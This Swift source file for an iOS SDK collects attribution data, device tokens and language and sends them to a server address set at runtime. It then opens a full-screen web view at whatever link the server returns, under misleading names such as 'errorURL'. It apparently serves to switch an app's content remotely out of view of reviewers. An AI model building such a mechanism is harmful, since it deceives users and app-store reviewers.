import Foundation
import UIKit
import AppsFlyerLib
import Alamofire
import SwiftUI
import FBSDKCoreKit
import FBAEMKit
import AppTrackingTransparency
import AdSupport
import SdkPushExpress
import Combine
import WebKit

public class SkylineSDK: NSObject , AppsFlyerLibDelegate {
    
    @AppStorage("savedData") var savedData: String?
    @AppStorage("initialURL") var initialURL: String?
    @AppStorage("statusFlag") var statusFlag: Bool = false
    
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        var conversionData = [String: Any]()

        conversionData[appsIDString] = AppsFlyerLib.shared().getAppsFlyerUID()
        conversionData[appsDataString] = conversionInfo
        conversionData[tokenString] = deviceToken
        conversionData[langString] = Locale.current.languageCode

        let jsonData = try! JSONSerialization.data(withJSONObject: conversionData, options: .fragmentsAllowed)
        let jsonString = String(data: jsonData, encoding: .utf8) ?? ""

        sendDataToServer(code: jsonString) { result in
            switch result {
            case .success(let message):
                self.sendNotification(name: "SkylineSDKNotification", message: message)
            case .failure:
                self.sendNotificationError(name: "SkylineSDKNotification")
            }
        }
    }
    
    public func onConversionDataFail(_ error: any Error) {
        self.sendNotificationError(name: "SkylineSDKNotification")
    }
    
    private func sendNotification(name: String, message: String) {
//        DispatchQueue.main.async {
//            self.showWeb(with: message)
//        }
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": message]
            )
        }
    }
    
    
    private func sendNotificationError(name: String) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(
                name: NSNotification.Name(name),
                object: nil,
                userInfo: ["notificationMessage": "Error occurred"]
            )
        }
    }
    
    public static let shared = SkylineSDK()
    private var hasSessionStarted = false
    private var deviceToken: String = ""
    private var session: Session
    private var cancellables = Set<AnyCancellable>()

    
    private var appsDataString: String = ""
    private var appsIDString: String = ""
    private var langString: String = ""
    private var tokenString: String = ""
    
    private var domen: String = ""
    private var paramName: String = ""
    private var mainWindow: UIWindow?
    
    private override init() {
        let sessionConfig = URLSessionConfiguration.default
        sessionConfig.timeoutIntervalForRequest = 20
        sessionConfig.timeoutIntervalForResource = 20
        self.session = Alamofire.Session(configuration: sessionConfig)
    }

    public func initialize(
        appsFlyerKey: String,
        appID: String,
        pushExpressKey: String,
        appsDataString: String,
        appsIDString: String,
        langString: String,
        tokenString: String,
        domen: String,
        paramName: String,
        application: UIApplication,
        window: UIWindow,
        completion: @escaping (Result<String, Error>) -> Void
    ) {
        
        self.appsDataString = appsDataString
        self.appsIDString = appsIDString
        self.langString = langString
        self.tokenString = tokenString
        self.domen = domen
        self.paramName = paramName
        self.mainWindow = window

        ApplicationDelegate.shared.application(application, didFinishLaunchingWithOptions: nil)
        Settings.shared.isAdvertiserIDCollectionEnabled = true
        Settings.shared.isAutoLogAppEventsEnabled = true

        // Инициализация PushExpress
        try? PushExpressManager.shared.initialize(appId: pushExpressKey)

        // Инициализация AppsFlyer
        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerKey
        AppsFlyerLib.shared().appleAppID = appID
        AppsFlyerLib.shared().delegate = self
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 15)
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSessionDidBecomeActive),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        
        completion(.success("Initialization completed successfully"))
    }

    public func registerForRemoteNotifications(deviceToken: Data) {
        let tokenString = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        PushExpressManager.shared.transportToken = tokenString
        self.deviceToken = tokenString
    }

    @objc private func handleSessionDidBecomeActive() {
        if !self.hasSessionStarted {
            AppsFlyerLib.shared().start()
            self.hasSessionStarted = true

            ATTrackingManager.requestTrackingAuthorization { _ in }
        }
    }

    public func sendDataToServer(code: String, completion: @escaping (Result<String, Error>) -> Void) {
        let parameters = [paramName: code]

        session.request(domen, method: .get, parameters: parameters)
            .validate()
            .responseDecodable(of: ResponseData.self) { response in
                switch response.result {
                case .success(let decodedData):
                    PushExpressManager.shared.tags["webmaster"] = decodedData.naming
                    self.statusFlag = decodedData.first_link
                    try? PushExpressManager.shared.activate()
                    
                    if self.initialURL == nil {
                        self.initialURL = decodedData.naming
                        if self.statusFlag {
                            self.savedData = decodedData.naming
                        }
                        completion(.success(decodedData.link))
                    } else if decodedData.link == self.initialURL {
                        if self.savedData == nil {
                            if self.statusFlag {
                                self.savedData = decodedData.link
                            }
                            completion(.success(decodedData.link))
                        } else {
                            completion(.success(self.savedData!))
                        }
                    } else {
                        self.savedData = nil
                        self.initialURL = decodedData.link
                        if self.statusFlag {
                            self.savedData = decodedData.link
                        }
                        completion(.success(decodedData.link))
                    }
                    
                   
                case .failure:
                    try? PushExpressManager.shared.activate()
                    completion(.failure(NSError(domain: "SkylineSDK", code: -1, userInfo: [NSLocalizedDescriptionKey: "Error occurred"])))
                }
            }
    }
    
    struct ResponseData: Codable {
        var link: String
        var naming: String
        var first_link: Bool
    }

    
    func showWeb(with: String){
        self.mainWindow = UIWindow(frame: UIScreen.main.bounds)
        let webController = WebController()
        webController.errorURL = with
        let navController = UINavigationController(rootViewController: webController)
        self.mainWindow?.rootViewController = navController
        self.mainWindow?.makeKeyAndVisible()
    }
//    private var statusFlag: Bool = false


}


public class WebController: UIViewController {

    // MARK: Properties
    private lazy var mainErrorsHandler: WKWebView = {
        let view = WKWebView()
        return view
    }()

    @AppStorage("savedData") var savedData: String?
    @AppStorage("statusFlag") var statusFlag: Bool = false
    
    public var errorURL: String!

    private var popUps: [WKWebView] = []

    // MARK: Lifecycle
    public override func viewDidLoad() {
        super.viewDidLoad()
        self.popUps = []

        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        config.mediaTypesRequiringUserActionForPlayback = []
        
        let source = """
        var meta = document.createElement('meta');
        meta.name = 'viewport';
        meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
        var head = document.getElementsByTagName('head')[0];
        head.appendChild(meta);
        """
        let script = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        config.userContentController.addUserScript(script)
        
        mainErrorsHandler = WKWebView(frame: .zero, configuration: config)

        view.addSubview(mainErrorsHandler)

        mainErrorsHandler.isOpaque = false
        mainErrorsHandler.backgroundColor = UIColor.clear
        mainErrorsHandler.navigationDelegate = self
        mainErrorsHandler.uiDelegate = self
        mainErrorsHandler.allowsBackForwardNavigationGestures = true
        mainErrorsHandler.reloadInputViews()
        
        mainErrorsHandler.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            mainErrorsHandler.topAnchor.constraint(equalTo: self.view.topAnchor),
            mainErrorsHandler.bottomAnchor.constraint(equalTo: self.view.bottomAnchor),
            mainErrorsHandler.leadingAnchor.constraint(equalTo: self.view.leadingAnchor),
            mainErrorsHandler.trailingAnchor.constraint(equalTo: self.view.trailingAnchor)
        ])

        loadContent(urlString: errorURL)
    }

    public override func viewWillAppear(_ animated: Bool) {
        navigationItem.largeTitleDisplayMode = .never
        navigationController?.isNavigationBarHidden = true
    }

    public override func viewDidDisappear(_ animated: Bool) {
        super.viewDidDisappear(animated)
    }

    private func loadContent(urlString: String) {
        if let encodedURL = urlString.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
           let url = URL(string: encodedURL) {
            var urlRequest = URLRequest(url: url)
            urlRequest.cachePolicy = .returnCacheDataElseLoad
            mainErrorsHandler.load(urlRequest)
        }
    }
}

extension WebController: WKNavigationDelegate {

    public func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        if let url = webView.url?.absoluteString {
            if savedData == nil {
                savedData = url
            }
        }
    }

    public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        if navigationAction.targetFrame == nil, let url = navigationAction.request.url, UIApplication.shared.canOpenURL(url) {
            var urlRequest = URLRequest(url: url)
            urlRequest.cachePolicy = .returnCacheDataElseLoad
            webView.load(urlRequest)
        }
        decisionHandler(.allow)
    }
}

extension WebController: WKUIDelegate {
    public func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if navigationAction.targetFrame == nil {
            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.navigationDelegate = self
            popupWebView.uiDelegate = self
            popupWebView.allowsBackForwardNavigationGestures = true
            self.mainErrorsHandler.addSubview(popupWebView)
            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: self.mainErrorsHandler.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: self.mainErrorsHandler.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: self.mainErrorsHandler.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: self.mainErrorsHandler.trailingAnchor)
            ])

            self.popUps.append(popupWebView)
            return popupWebView
        }
        return nil
    }
}

public struct WebControllerSwiftUI: UIViewControllerRepresentable {
    public var errorDetail: String

    public func makeUIViewController(context: Context) -> WebController {
        let viewController = WebController()
        viewController.errorURL = errorDetail
        return viewController
    }

    public func updateUIViewController(_ uiViewController: WebController, context: Context) {}
}


